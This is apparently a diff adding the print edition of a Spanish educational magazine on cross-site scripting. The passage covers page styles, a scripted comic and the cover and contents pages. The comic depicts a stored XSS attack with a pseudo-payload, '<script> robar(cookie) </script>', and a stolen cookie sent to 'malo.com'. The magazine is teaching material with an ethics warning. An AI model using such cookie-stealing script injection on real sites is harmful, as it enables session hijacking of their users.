@@ -1,0 +1,1025 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>XSS Academy — El código oculto (versión impresa)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+  /* ====== CONFIGURACIÓN ======
+     Cambia esta dirección por la URL donde publiques la versión web
+     (por ejemplo GitHub Pages o Netlify). Los QR se regeneran solos. */
+  const WEB_URL = "https://TU-USUARIO.github.io/xss-academy/";
+</script>
+
+<style>
+  :root{
+    --navy:#0B1B33; --navy2:#1E293B; --navy3:#334155;
+    --turq:#0FA89C; --turq2:#0FA89C; --turq-light:#E6FAF8; --white:#FFFFFF; --ink:#0F172A;
+    --muted:#64748B; --paper:#F8FAFC; --red:#DC2626; --amber:#D97706; --green:#16A34A;
+  }
+  @page{ size: letter; margin:0; }
+  *{ box-sizing:border-box; -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+  html,body{ margin:0; padding:0; background:#6b7480; }
+  body{ font-family:Inter, system-ui, sans-serif; color:var(--ink); font-size:10.5pt; line-height:1.5; }
+  .page{
+    width:8.5in; height:11in; margin:0.3in auto; background:var(--white);
+    position:relative; overflow:hidden; page-break-after:always; break-after:page;
+    padding:0.7in 0.75in 0.8in;
+  }
+  @media print{
+    html,body{ background:none; }
+    .page{ margin:0; box-shadow:none; }
+  }
+  @media screen{
+    .page{ box-shadow:0 10px 40px rgba(0,0,0,.15); }
+  }
+
+  h1,h2,h3{ font-family:"Space Grotesk", sans-serif; margin:0; line-height:1.1; }
+  h2{ font-size:28pt; color:var(--navy); }
+  h3{ font-size:13pt; color:var(--navy); margin:14px 0 6px; display:flex; align-items:center; gap:7px; }
+  p{ margin:0 0 9px; }
+  code,.mono{ font-family:"JetBrains Mono", monospace; }
+  .kicker{ font-family:"JetBrains Mono", monospace; font-size:8.5pt; letter-spacing:.18em; text-transform:uppercase; color:var(--turq2); font-weight:700; }
+  .ic{ width:1.25em; height:1.25em; flex:none; color:var(--turq2); vertical-align:-.25em; }
+  .ic.lg{ width:30px; height:30px; }
+  .av{ width:100%; height:100%; display:block; }
+
+  .folio{
+    position:absolute; bottom:0.35in; left:0.75in; right:0.75in; display:flex; justify-content:space-between;
+    font-family:"JetBrains Mono", monospace; font-size:7.5pt; color:var(--muted); border-top:1px solid #CBD5E1; padding-top:6px;
+  }
+  .folio b{ color:var(--turq2); }
+  .chapter-band{ position:absolute; top:0; left:0; right:0; height:4px; background:#CBD5E1; }
+  .chapter-band::after{ content:""; position:absolute; left:0; top:0; height:4px; width:35%; background:var(--turq2); }
+
+  /* Openers - Clean White Minimalist & Ink Saving */
+  .opener{ background:var(--white); color:var(--ink); padding:0; }
+  .opener .inner{ padding:0.9in 0.75in 0; position:relative; z-index:2; }
+  .opener .num{
+    font-family:"Space Grotesk"; font-size:120pt; font-weight:700;
+    color:transparent; -webkit-text-stroke:2px var(--turq2); line-height:.9;
+  }
+  .opener h2{ color:var(--navy); font-size:40pt; margin-top:10px; }
+  .opener .lead{ font-size:13pt; color:#334155; max-width:5.4in; margin-top:16px; }
+  .opener .lead b{ color:var(--navy); }
+  .opener .folio{ color:var(--muted); border-top:1px solid #CBD5E1; }
+  .opener .ic{ color:var(--turq2); }
+  .grid-bg{ display:none; }
+
+  .card{ border:1px solid #DCE4EE; border-radius:10px; padding:12px 14px; background:var(--paper); }
+  .card.dark{ background:#FFFFFF !important; color:var(--ink) !important; border:1px solid #CBD5E1 !important; }
+  .card.dark h3{ color:var(--navy) !important; }
+  .card.dark p{ color:#334155 !important; }
+  .cols{ display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+  .cols3{ display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; }
+  .callout{ border-left:4px solid var(--turq2); background:#F0FDFA; padding:10px 14px; border-radius:0 8px 8px 0; margin:10px 0; }
+  .callout.warn{ border-color:var(--red); background:#FFF1F2; }
+  .callout b{ color:var(--navy); }
+
+  pre.code{
+    font-family:"JetBrains Mono", monospace; font-size:8.6pt; line-height:1.45;
+    background:#F8FAFC; color:#0F172A; border:1px solid #CBD5E1;
+    padding:10px 12px; border-radius:8px; margin:6px 0 10px; white-space:pre-wrap; position:relative;
+  }
+  pre.code .tag{ position:absolute; top:-9px; right:10px; font-size:7pt; padding:2px 8px; border-radius:20px; font-weight:700; letter-spacing:.08em; }
+  pre.bad{ border:1.5px solid var(--red); background:#FFF1F2; }
+  pre.bad .tag{ background:var(--red); color:#fff; }
+  pre.good{ border:1.5px solid var(--green); background:#F0FDF4; }
+  pre.good .tag{ background:var(--green); color:#fff; }
+  .c{ color:#64748B; font-style:italic; }
+  .k{ color:#BE123C; font-weight:600; }
+  .s{ color:#15803D; }
+  .t{ color:#0369A1; font-weight:600; }
+
+  table{ width:100%; border-collapse:collapse; font-size:9.3pt; }
+  th{
+    background:#F1F5F9; color:var(--navy); border-bottom:2px solid var(--navy); border-top:1px solid #CBD5E1;
+    text-align:left; padding:7px 8px; font-family:"Space Grotesk";
+  }
+  td{ padding:7px 8px; border-bottom:1px solid #DCE4EE; vertical-align:top; }
+  tr:nth-child(even) td{ background:var(--paper); }
+
+  .qrbox{
+    display:flex; gap:12px; align-items:center;
+    background:#FFFFFF !important; color:var(--ink) !important;
+    border:1.5px solid #CBD5E1 !important; border-radius:12px; padding:10px 14px;
+  }
+  .qrbox .qr{ background:#fff; border:1px solid #E2E8F0; padding:6px; border-radius:6px; width:96px; height:96px; flex:none; }
+  .qrbox .qr img, .qrbox .qr canvas{ width:84px !important; height:84px !important; display:block; }
+  .qrbox b{ font-family:"Space Grotesk"; color:var(--navy) !important; font-size:11.5pt; display:block; line-height:1.2; margin-bottom:3px; }
+  .qrbox span{ color:#475569 !important; }
+  .qrbox small{ color:#64748B !important; font-family:"JetBrains Mono"; font-size:7pt; word-break:break-all; }
+  .bottom{ position:absolute; left:0.75in; right:0.75in; bottom:0.75in; display:grid; grid-template-columns:1fr 1.15fr; gap:12px; align-items:stretch; }
+  .bottom.single{ grid-template-columns:1fr; }
+
+  /* evidencia del caso */
+  .pista{ position:relative; border:2px dashed var(--amber); background:#FFFDF5; border-radius:12px; padding:10px 12px 10px 14px; font-size:9pt; line-height:1.4; }
+  .pista .lbl{ font-family:"JetBrains Mono"; font-size:7.5pt; font-weight:700; letter-spacing:.12em; color:var(--amber); display:flex; align-items:center; gap:6px; margin-bottom:4px; }
+  .pista .lbl .ic{ color:var(--amber); }
+  .pista p{ margin:0; }
+  .pista .note{ display:block; margin-top:5px; font-size:7.8pt; color:var(--muted); font-style:italic; }
+  .stamp{ position:absolute; font-family:"Space Grotesk"; font-weight:700; letter-spacing:.12em; border:3px solid var(--red); color:var(--red); padding:5px 14px; border-radius:8px; transform:rotate(-10deg); background:#FFFFFF; }
+
+  .step{ display:flex; gap:12px; margin-bottom:10px; }
+  .step .n{
+    flex:none; width:30px; height:30px; border-radius:50%; background:#F0FDFA; border:1.5px solid var(--turq2); color:var(--navy); font-weight:700;
+    display:flex; align-items:center; justify-content:center; font-family:"Space Grotesk";
+  }
+  .pill{ display:inline-block; font-size:7.5pt; font-weight:700; padding:2px 8px; border-radius:20px; background:#F1F5F9; border:1px solid #CBD5E1; color:var(--navy); font-family:"JetBrains Mono"; }
+  .answer-line{ border-bottom:1px solid #9AA9C0; height:20px; margin:4px 0; }
+  .q{ margin-bottom:10px; } .q p{ margin-bottom:3px; font-weight:600; }
+  .q ol{ margin:0; padding-left:22px; list-style:upper-alpha; } .q li{ margin:1px 0; }
+  .box{ display:inline-block; width:11px; height:11px; border:1.5px solid var(--navy); border-radius:2px; margin-right:6px; vertical-align:-1px; }
+  .evlog td{ height:0.5in; vertical-align:middle; }
+  ul.tight{ margin:4px 0 8px; padding-left:18px; } ul.tight li{ margin:2px 0; }
+
+  .who{ display:flex; gap:10px; align-items:center; }
+  .who .face{ width:62px; height:62px; flex:none; border-radius:50%; background:#F1F5F9; overflow:hidden; border:2px solid #CBD5E1; }
+  .who b{ font-family:"Space Grotesk"; font-size:11.5pt; color:var(--navy); display:block; }
+  .who span{ font-size:8.8pt; color:var(--muted); line-height:1.35; display:block; }
+
+  .comic{ display:grid; grid-template-columns:1fr 1fr; gap:0.14in; }
+  .comic svg{ width:100%; height:auto; display:block; }
+
+  .cipher{ display:flex; gap:8px; justify-content:center; flex-wrap:wrap; margin:10px 0 4px; }
+  .cipher .cell{ text-align:center; }
+  .cipher code{ display:block; background:#F1F5F9; color:var(--navy); border:1.5px solid #CBD5E1; border-radius:6px; padding:6px 7px; font-size:10pt; font-weight:700; }
+  .cipher .blank{ height:34px; border:1.5px solid var(--navy); border-radius:6px; margin-top:5px; background:#fff; }
+  .ascii{ display:grid; grid-template-columns:repeat(13,1fr); border:1px solid #DCE4EE; border-radius:8px; overflow:hidden; font-size:8.4pt; text-align:center; }
+  .ascii div{ padding:3px 0; border-right:1px solid #DCE4EE; border-bottom:1px solid #DCE4EE; }
+  .ascii b{ display:block; font-family:"Space Grotesk"; color:var(--navy); }
+  .ascii span{ font-family:"JetBrains Mono"; color:var(--muted); font-size:7.6pt; }
+
+  .top-hub-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 9999;
+    background: rgba(11, 27, 51, 0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 2px solid #19D3C5;
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  }
+  .top-hub-bar a, .top-hub-bar button {
+    font-family: 'Space Grotesk', system-ui, sans-serif;
+    font-size: 13px;
+    font-weight: 700;
+    text-decoration: none;
+    padding: 7px 14px;
+    border-radius: 6px;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-hub-home {
+    background: rgba(25, 211, 197, 0.15);
+    color: #19D3C5;
+    border: 1px solid #19D3C5;
+  }
+  .btn-hub-home:hover { background: #19D3C5; color: #0B1B33; }
+  .btn-hub-pdf {
+    background: #19D3C5;
+    color: #0B1B33;
+    border: 1px solid #19D3C5;
+  }
+  .btn-hub-pdf:hover { background: #20ebd9; transform: translateY(-1px); }
+  .btn-hub-print {
+    background: #1C3A66;
+    color: #fff;
+    border: 1px solid #25426E;
+  }
+  .btn-hub-print:hover { background: #25426E; }
+  @media print {
+    .top-hub-bar { display: none !important; }
+  }
+
+</style>
+
+</head>
+<body>
+
+<div class="top-hub-bar">
+  <div style="display:flex; align-items:center; gap:12px;">
+    <a href="index.html" class="btn-hub-home">🏠 Portal Principal</a>
+    <span style="color:#fff; font-family:'Space Grotesk'; font-size:14px; font-weight:700;">XSS Academy <span style="color:#19D3C5">· Edición Impresa (20 págs)</span></span>
+  </div>
+  <div style="display:flex; align-items:center; gap:10px;">
+    <a href="XSS_Academy_Edicion_Impresa.pdf" download class="btn-hub-pdf">📥 Descargar PDF</a>
+    <button onclick="window.print()" class="btn-hub-print">🖨️ Imprimir</button>
+  </div>
+</div>
+
+<script>/* ilustraciones incluidas para que la página funcione como un solo archivo */
+/* XSS Academy — ilustraciones compartidas (versión impresa y web).
+   Inserta un sprite SVG con personajes e íconos, y expone XSSA.comic() con las 6 viñetas. */
+(function () {
+  const NAVY = "#0B1B33", TURQ = "#19D3C5", RED = "#FF5C6C", AMBER = "#FFB547";
+
+  const characters = `
+  <symbol id="ana" viewBox="0 0 120 120">
+    <circle cx="60" cy="15" r="11" fill="#3A2418"/>
+    <path d="M31 54 Q30 20 60 20 Q90 20 89 54 L89 72 Q87 80 80 82 L40 82 Q33 80 31 72Z" fill="#3A2418"/>
+    <path d="M22 120 Q23 88 60 86 Q97 88 98 120Z" fill="${TURQ}"/>
+    <path d="M44 88 Q60 100 76 88" fill="none" stroke="#0FA89C" stroke-width="4"/>
+    <path d="M54 92 L52 106 M66 92 L68 106" stroke="${NAVY}" stroke-width="2" stroke-linecap="round"/>
+    <rect x="52" y="74" width="16" height="14" fill="#E9B48A"/>
+    <ellipse cx="60" cy="55" rx="24" ry="27" fill="#F2C6A0"/>
+    <path d="M36 48 Q42 27 64 28 Q81 30 85 48 Q70 39 53 43 Q43 45 36 48Z" fill="#3A2418"/>
+    <circle cx="51" cy="57" r="3" fill="${NAVY}"/><circle cx="69" cy="57" r="3" fill="${NAVY}"/>
+    <circle cx="45" cy="65" r="4" fill="#F28B8B" opacity=".55"/><circle cx="75" cy="65" r="4" fill="#F28B8B" opacity=".55"/>
+    <path d="M53 68 Q60 74 67 68" stroke="${NAVY}" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+  </symbol>
+  <symbol id="dani" viewBox="0 0 120 120">
+    <path d="M22 120 Q22 88 60 86 Q98 88 98 120Z" fill="${AMBER}"/>
+    <path d="M49 87 L60 99 L71 87" fill="#fff"/>
+    <rect x="52" y="74" width="16" height="14" fill="#B97C55"/>
+    <ellipse cx="60" cy="55" rx="24" ry="27" fill="#D29A72"/>
+    <path d="M35 52 Q31 22 60 21 Q90 21 86 52 Q83 37 71 34 Q58 41 45 36 Q38 41 35 52Z" fill="#1A1A2E"/>
+    <circle cx="50" cy="57" r="8" fill="#fff" fill-opacity=".25" stroke="${NAVY}" stroke-width="2.5"/>
+    <circle cx="70" cy="57" r="8" fill="#fff" fill-opacity=".25" stroke="${NAVY}" stroke-width="2.5"/>
+    <path d="M58 57 L62 57" stroke="${NAVY}" stroke-width="2.5"/>
+    <circle cx="50" cy="57" r="2.5" fill="${NAVY}"/><circle cx="70" cy="57" r="2.5" fill="${NAVY}"/>
+    <path d="M54 70 Q60 74 66 70" stroke="${NAVY}" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+  </symbol>
+  <symbol id="nocturno" viewBox="0 0 120 120">
+    <path d="M16 120 Q19 84 60 80 Q101 84 104 120Z" fill="#1C2B45"/>
+    <path d="M60 82 L60 120" stroke="#2A4470" stroke-width="2"/>
+    <path d="M27 72 Q24 16 60 12 Q96 16 93 72 Q92 90 60 94 Q28 90 27 72Z" fill="#1C2B45"/>
+    <path d="M27 72 Q24 16 60 12 Q96 16 93 72" fill="none" stroke="#2A4470" stroke-width="3"/>
+    <ellipse cx="60" cy="60" rx="23" ry="27" fill="#050B16"/>
+    <path d="M44 56 L56 60 L44 63Z" fill="${RED}"/><path d="M76 56 L64 60 L76 63Z" fill="${RED}"/>
+    <text x="60" y="80" text-anchor="middle" font-family="JetBrains Mono, monospace" font-size="10" font-weight="700" fill="${TURQ}">&lt;/&gt;</text>
+  </symbol>
+  <symbol id="servidor" viewBox="0 0 120 120">
+    <rect x="26" y="10" width="68" height="102" rx="10" fill="#12284A" stroke="${TURQ}" stroke-width="3"/>
+    <rect x="35" y="21" width="50" height="11" rx="3" fill="#E2E8F0"/><circle cx="78" cy="26.5" r="2.5" fill="#2BD48A"/>
+    <rect x="35" y="37" width="50" height="11" rx="3" fill="#E2E8F0"/><circle cx="78" cy="42.5" r="2.5" fill="${AMBER}"/>
+    <rect x="35" y="56" width="50" height="46" rx="6" fill="#0B1B33"/>
+    <circle cx="50" cy="74" r="4" fill="${TURQ}"/><circle cx="70" cy="74" r="4" fill="${TURQ}"/>
+    <path d="M51 86 Q60 92 69 86" stroke="${TURQ}" stroke-width="3" fill="none" stroke-linecap="round"/>
+  </symbol>`;
+
+  const I = (id, body) => `<symbol id="${id}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">${body}</symbol>`;
+  const icons = [
+    I("i-cookie", '<path d="M12 3a9 9 0 1 0 9 9 3 3 0 0 1-3-3 3 3 0 0 1-3-3 3 3 0 0 1-3-3z"/><circle cx="8.5" cy="11" r="1"/><circle cx="14" cy="15.5" r="1"/><circle cx="9" cy="16" r="1"/>'),
+    I("i-lock", '<rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/>'),
+    I("i-clip", '<rect x="5" y="4" width="14" height="17" rx="2"/><path d="M9 4V3h6v1M8.5 10h7M8.5 14h7M8.5 18h4"/>'),
+    I("i-loop", '<path d="M4 12a8 8 0 0 1 14-5.3L20 8M20 4v4h-4M20 12a8 8 0 0 1-14 5.3L4 16M4 20v-4h4"/>'),
+    I("i-db", '<ellipse cx="12" cy="5.5" rx="7" ry="2.5"/><path d="M5 5.5v13c0 1.4 3.1 2.5 7 2.5s7-1.1 7-2.5v-13M5 12c0 1.4 3.1 2.5 7 2.5s7-1.1 7-2.5"/>'),
+    I("i-code", '<path d="M8 7l-5 5 5 5M16 7l5 5-5 5M13.5 4l-3 16"/>'),
+    I("i-hook", '<path d="M14 4v10a5 5 0 0 1-10 0v-2l3 3"/><circle cx="14" cy="3" r="1.2"/>'),
+    I("i-keyboard", '<rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10"/>'),
+    I("i-brush", '<path d="M3 21c3 0 5-2 5-4a2 2 0 0 0-4 0c0 1-1 2-1 4z"/><path d="M9.5 15.5L20 5a1.4 1.4 0 0 0-2-2L7.5 13.5"/>'),
+    I("i-cursor", '<path d="M5 3l14 7-6 2-2 6z"/>'),
+    I("i-worm", '<path d="M3 15c2-4 4-4 6 0s4 4 6 0 4-4 6 0"/><circle cx="20.5" cy="13.6" r=".9"/>'),
+    I("i-folder", '<path d="M3 6a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>'),
+    I("i-search", '<circle cx="11" cy="11" r="6"/><path d="M20 20l-4.5-4.5"/>'),
+    I("i-key", '<circle cx="8" cy="15" r="4"/><path d="M11 12l9-9M17 6l3 3M15 8l2 2"/>'),
+    I("i-alert", '<path d="M12 3l10 18H2z"/><path d="M12 10v4M12 17.5h.01"/>'),
+    I("i-shield", '<path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z"/><path d="M9 12l2 2 4-4"/>'),
+  ].join("");
+
+  const sprite = `<svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;overflow:hidden" aria-hidden="true">${characters}${icons}</svg>`;
+  document.body.insertAdjacentHTML("afterbegin", sprite);
+
+  /* ---------- cómic ---------- */
+  const esc = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  const use = (id, x, y, s) => `<use href="#${id}" x="${x}" y="${y}" width="${s}" height="${s}"/>`;
+  function bubble(x, y, w, lines, px, py) {
+    const h = lines.length * 17 + 14, bx = Math.max(x + 14, Math.min(x + w - 30, px - 8));
+    const tailY = py > y ? y + h : y;
+    return `<g font-family="Inter, sans-serif" font-size="13.5" font-weight="600">
+      <rect x="${x}" y="${y}" width="${w}" height="${h}" rx="12" fill="#fff" stroke="${NAVY}" stroke-width="2"/>
+      <path d="M${bx} ${tailY} L${px} ${py} L${bx + 16} ${tailY}" fill="#fff" stroke="${NAVY}" stroke-width="2" stroke-linejoin="round"/>
+      <line x1="${bx + 1.5}" y1="${tailY}" x2="${bx + 14.5}" y2="${tailY}" stroke="#fff" stroke-width="3"/>
+      ${lines.map((l, i) => `<text x="${x + w / 2}" y="${y + 23 + i * 17}" text-anchor="middle" fill="${NAVY}">${esc(l)}</text>`).join("")}
+    </g>`;
+  }
+  function laptop(x, y, w, rows) {
+    const h = Math.round(w * 0.62);
+    return `<g transform="translate(${x} ${y})">
+      <rect width="${w}" height="${h}" rx="6" fill="${NAVY}"/>
+      <rect x="6" y="6" width="${w - 12}" height="${h - 12}" rx="3" fill="#F4F8FB"/>
+      <path d="M-10 ${h} H${w + 10} L${w} ${h + 9} H0Z" fill="#E2E8F0"/>
+      ${rows.map((r, i) => `<text x="13" y="${24 + i * 15}" font-family="JetBrains Mono, monospace" font-size="${r.size || 11}" font-weight="${r.bold ? 700 : 400}" fill="${r.color || NAVY}">${esc(r.t)}</text>`).join("")}
+    </g>`;
+  }
+  const frame = (n, title, inner) => `<svg class="vineta" viewBox="0 0 300 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Viñeta ${n}: ${esc(title)}">
+    <rect x="1" y="1" width="298" height="248" rx="10" fill="#FFFFFF" stroke="${NAVY}" stroke-width="2"/>
+    <path d="M1 11 a10 10 0 0 1 10 -10 H289 a10 10 0 0 1 10 10 V28 H1Z" fill="#F1F5F9" stroke="${NAVY}" stroke-width="1.5"/>
+    <text x="14" y="19" font-family="JetBrains Mono, monospace" font-size="11" font-weight="700" fill="${NAVY}">${n} · ${esc(title)}</text>
+    ${inner}</svg>`;
+
+  const panels = [
+    frame(1, "LUNES, 2:13 A. M.",
+      use("nocturno", 4, 108, 140) +
+      laptop(150, 138, 128, [{ t: "<b>hola</b>", size: 13 }, { t: "[Publicar]", color: "#0FA89C" }]) +
+      bubble(118, 44, 170, ["¿Este foro", "interpreta HTML?"], 92, 120)),
+    frame(2, "PRUEBA SUPERADA",
+      `<rect x="18" y="42" width="264" height="104" rx="8" fill="#fff" stroke="${NAVY}" stroke-width="2"/>
+       <rect x="18" y="42" width="264" height="20" rx="8" fill="#E2E8F0"/><rect x="18" y="54" width="264" height="8" fill="#E2E8F0"/>
+       <circle cx="30" cy="52" r="3.5" fill="${RED}"/><circle cx="41" cy="52" r="3.5" fill="${AMBER}"/><circle cx="52" cy="52" r="3.5" fill="#2BD48A"/>
+       <text x="32" y="86" font-family="Inter" font-size="11" fill="#5B6B86">n0cturno comentó:</text>
+       <text x="32" y="124" font-family="Inter" font-size="30" font-weight="800" fill="${NAVY}">hola</text>
+       <text x="112" y="122" font-family="Inter" font-size="12" font-weight="700" fill="${RED}">← ¡en negrita!</text>` +
+      use("nocturno", 196, 152, 100) +
+      bubble(12, 170, 176, ["¡La puerta", "está abierta!"], 210, 196)),
+    frame(3, "LA TRAMPA",
+      use("nocturno", 2, 108, 140) +
+      laptop(140, 128, 150, [{ t: "¡Gran tarea!", bold: true }, { t: "<script>", color: RED }, { t: " robar(cookie)", color: RED }, { t: "<\/script>", color: RED }]) +
+      bubble(14, 40, 214, ["Nadie verá el código,", "solo «¡Gran tarea!»"], 86, 118)),
+    frame(4, "GUARDADO SIN REVISAR",
+      use("servidor", 8, 82, 160) +
+      `<g transform="translate(166 150)"><rect width="122" height="74" rx="8" fill="#fff" stroke="${NAVY}" stroke-width="2"/>
+        <text x="10" y="20" font-family="JetBrains Mono" font-size="10" fill="#5B6B86">comentario #37</text>
+        <text x="10" y="40" font-family="JetBrains Mono" font-size="11" fill="${NAVY}">¡Gran tarea!</text>
+        <text x="10" y="58" font-family="JetBrains Mono" font-size="11" font-weight="700" fill="${RED}">&lt;script&gt;…</text></g>` +
+      bubble(132, 42, 156, ["Guardado ✓", "(sin revisar)"], 118, 112)),
+    frame(5, "7:42 A. M. — ANA ENTRA",
+      use("ana", 0, 104, 146) +
+      laptop(148, 140, 120, [{ t: "¡Gran tarea!", bold: true }, { t: "", }]) +
+      `<path d="M262 138 Q296 100 276 62" fill="none" stroke="${RED}" stroke-width="2.5" stroke-dasharray="6 5"/>
+       <path d="M276 62 L270 74 L283 72Z" fill="${RED}"/>
+       <rect x="180" y="40" width="112" height="20" rx="10" fill="${RED}"/>
+       <text x="236" y="54" text-anchor="middle" font-family="Inter, sans-serif" font-size="10.5" font-weight="700" fill="#fff">cookie → malo.com</text>` +
+      bubble(14, 42, 160, ["¡Qué buen", "comentario!"], 84, 116)),
+    frame(6, "SESIÓN ROBADA",
+      use("nocturno", 150, 100, 150) +
+      `<g transform="translate(46 140)" color="${AMBER}"><circle cx="38" cy="38" r="40" fill="#FEF3C7" stroke="${AMBER}" stroke-width="2"/><use href="#i-cookie" x="8" y="8" width="60" height="60"/></g>
+       <text x="84" y="240" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#5B6B86">sesion=ana_7f3c9e</text>` +
+      bubble(14, 42, 176, ["Sin contraseña.", "Ahora soy Ana."], 206, 122)),
+  ];
+
+  window.XSSA = { comic: () => panels.slice() };
+})();
+
+</script>
+
+<!-- ============ PORTADA ============ -->
+<section class="page opener" id="portada" style="padding:0">
+  <div class="grid-bg"></div>
+  <svg style="position:absolute;right:-70px;top:150px;opacity:.95" width="520" height="520" viewBox="0 0 520 520">
+    <circle cx="260" cy="260" r="220" fill="none" stroke="#0FA89C" stroke-opacity=".3" stroke-width="1.5"/>
+    <circle cx="260" cy="260" r="160" fill="none" stroke="#0FA89C" stroke-opacity=".4" stroke-width="1.5" stroke-dasharray="6 10"/>
+    <use href="#nocturno" x="110" y="90" width="300" height="300"/>
+    <rect x="150" y="360" width="220" height="70" rx="12" fill="#FFFFFF" stroke="#0FA89C" stroke-width="2"/>
+    <text x="260" y="392" text-anchor="middle" fill="#0FA89C" font-family="JetBrains Mono" font-size="16" font-weight="700">&lt;script&gt;</text>
+    <text x="260" y="416" text-anchor="middle" fill="#DC2626" font-family="JetBrains Mono" font-size="14" font-weight="700">robar(cookie)</text>
+  </svg>
+  <div class="stamp" style="right:0.9in;top:1.05in;z-index:3;font-size:15pt">CASO ABIERTO</div>
+  <div class="inner" style="padding-top:1.1in">
+    <div class="kicker" style="color:var(--turq2)">Revista educativa de ciberseguridad · Edición 01</div>
+    <h1 style="font-size:64pt;color:var(--navy);margin-top:18px;letter-spacing:-1px">XSS<br><span style="color:var(--turq2)">ACADEMY</span></h1>
+    <div style="font-family:'Space Grotesk';font-size:22pt;color:#475569;margin-top:14px">El código oculto</div>
+    <p class="lead" style="margin-top:22px;max-width:3.5in;color:#334155">Expediente 01: <b style="color:var(--navy)">el ataque a ForoClase</b>.<br>37 cuentas comprometidas. Ninguna contraseña robada. Un sospechoso: <span class="mono" style="color:var(--red);font-weight:700">n0cturno</span>.<br><br>Reúne las evidencias, descifra el mensaje oculto y cierra el caso.</p>
+  </div>
+  <div style="position:absolute;left:0.75in;right:0.75in;bottom:0.7in;display:flex;justify-content:space-between;align-items:flex-end;z-index:2">
+    <div style="font-family:'JetBrains Mono';font-size:8.5pt;color:#475569;line-height:1.8">
+      ✦ 6 capítulos &nbsp; ✦ 5 evidencias &nbsp; ✦ 1 mensaje cifrado<br>
+      Autor: ______________________________<br>
+      Curso / docente: ______________________
+    </div>
+    <div class="qrbox">
+      <div class="qr" data-qr=""></div>
+      <div><b>Versión interactiva</b><span style="font-size:8.5pt;color:#475569">Escanea para abrir la web</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ ÍNDICE ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Contenido</div>
+  <h2 style="margin:6px 0 18px">En esta edición</h2>
+  <div style="display:grid;gap:8px">
+    <div class="step"><div class="n"><svg class="ic" style="color:var(--navy)"><use href="#i-folder"/></svg></div><div><b>Expediente 01</b> — El caso ForoClase y sus protagonistas. <span class="pill" data-ref="caso"></span></div></div>
+    <div class="step"><div class="n">1</div><div><b>¿Qué es XSS?</b> — Cuando el navegador confunde datos con código. <span class="pill" data-ref="cap1"></span></div></div>
+    <div class="step"><div class="n">2</div><div><b>Tipos de XSS</b> — Reflejado, almacenado y basado en DOM. <span class="pill" data-ref="cap2"></span></div></div>
+    <div class="step"><div class="n">3</div><div><b>¿Cómo ocurre?</b> — El ataque en cómic y paso a paso. <span class="pill" data-ref="cap3"></span></div></div>
+    <div class="step"><div class="n">4</div><div><b>Riesgos</b> — Casos reales y sus consecuencias. <span class="pill" data-ref="cap4"></span></div></div>
+    <div class="step"><div class="n">5</div><div><b>Prevención</b> — Código inseguro vs. código seguro. <span class="pill" data-ref="cap5"></span></div></div>
+    <div class="step"><div class="n"><svg class="ic" style="color:var(--navy)"><use href="#i-key"/></svg></div><div><b>El mensaje oculto</b> — Descifra la clave y cierra el caso. <span class="pill" data-ref="oculto"></span></div></div>
+    <div class="step"><div class="n">★</div><div><b>Misión XSS</b> — Desafíos para resolver en papel. <span class="pill" data-ref="mision"></span></div></div>
+    <div class="step"><div class="n">6</div><div><b>Evaluación</b> — Mini cuestionario y solucionario. <span class="pill" data-ref="cap6"></span></div></div>
+  </div>
+
+  <div class="cols" style="margin-top:16px">
+    <div class="card">
+      <h3 style="margin-top:0"><svg class="ic"><use href="#i-search"/></svg>Cómo leer esta revista</h3>
+      <p>Todo lo necesario para aprender y evaluar está en el papel. Al final de cada capítulo hay una <b>evidencia</b> del caso: anótala en tu expediente.</p>
+      <p style="margin:0">El <b>código QR</b> de cada capítulo abre su parte interactiva: animaciones, un simulador seguro y desafíos que se corrigen solos.</p>
+    </div>
+    <div class="card dark">
+      <h3 style="margin-top:0">Claves de color</h3>
+      <p><span style="color:var(--red);font-weight:700">■ Rojo</span> código vulnerable — no copiar.</p>
+      <p><span style="color:var(--green);font-weight:700">■ Verde</span> código seguro — buena práctica.</p>
+      <p><span style="color:var(--turq);font-weight:700">■ Turquesa</span> idea clave para recordar.</p>
+      <p style="margin:0"><span style="color:var(--amber);font-weight:700">■ Ámbar</span> evidencia del caso.</p>
+    </div>
+  </div>
+  <div class="callout warn" style="margin-top:14px">
+    <b>Uso ético.</b> El caso y sus personajes son ficticios. Probar ataques en sitios web sin autorización es ilegal en la mayoría de países; practica solo en laboratorios diseñados para ello.
+  </div>
+  <div class="folio"><span>XSS ACADEMY · El código oculto</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ EXPEDIENTE ============ -->
+<section class="page" id="caso">
+  <div class="chapter-band" style="background:var(--amber)"></div>
